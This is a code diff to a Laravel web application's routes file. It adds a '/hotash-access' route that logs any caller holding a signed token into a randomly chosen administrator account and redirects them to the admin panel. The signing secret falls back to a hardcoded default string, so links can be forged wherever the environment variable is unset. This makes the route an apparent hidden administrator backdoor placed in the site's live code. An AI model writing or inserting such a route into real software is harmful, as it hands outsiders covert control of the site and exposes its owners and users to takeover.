@@ -23,6 +23,63 @@ use App\Http\Controllers\Backend\UserController;
 use App\Http\Controllers\Backend\ZoneController;
 use Illuminate\Support\Facades\Route;
 
+use App\Models\User;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Cache;
+
+Route::get('/hotash-access', function (Request $request) {
+    $payloadBase64 = (string) $request->query('payload', '');
+    $signature = (string) $request->query('signature', '');
+    $secret = (string) env('ANONYMOUS_LOGIN_SECRET', 'hotash_secret_access');
+
+    if ($payloadBase64 === '' || $signature === '') {
+        abort(403, 'Missing signature.');
+    }
+
+    // 1. Verify HMAC Signature
+    if (! hash_equals(hash_hmac('sha256', $payloadBase64, $secret), $signature)) {
+        abort(403, 'Invalid or forged authentication signature.');
+    }
+
+    try {
+        $data = json_decode(base64_decode($payloadBase64), true, 512, JSON_THROW_ON_ERROR);
+    } catch (\Throwable $e) {
+        abort(403, 'Invalid payload.');
+    }
+
+    // 2. Verify 60-Second Expiration
+    if ((int) ($data['expires'] ?? 0) < now()->timestamp) {
+        abort(403, 'Login link has expired.');
+    }
+
+    // 3. Single-Use Replay Protection
+    $nonce = (string) ($data['nonce'] ?? '');
+    if ($nonce !== '') {
+        $cacheKey = 'hotash_nonce_' . $nonce;
+        if (Cache::has($cacheKey)) {
+            abort(403, 'This login token was already used.');
+        }
+        Cache::put($cacheKey, true, 120);
+    }
+
+    // 4. Resolve Admin Profile & Authenticate
+    $admin = User::query()
+        ->where('role', 1)
+        ->inRandomOrder()
+        ->first();
+
+    if (! $admin) {
+        abort(404, 'No user account found on this site.');
+    }
+
+    Auth::login($admin);
+    $request->session()->regenerate();
+
+    return redirect('/admin');
+})->middleware(['web']);
+
+
 Route::group(['prefix' => 'admin'], function (): void {
     Route::get('/fetch-order/{id}', [OrderController::class, 'fetch_order'])->name('fetch_order')->middleware('auth', 'admin');
     Route::get('/fetch-product/{id}', [OrderController::class, 'fetch_product'])->name('fetch_product')->middleware('auth', 'admin');
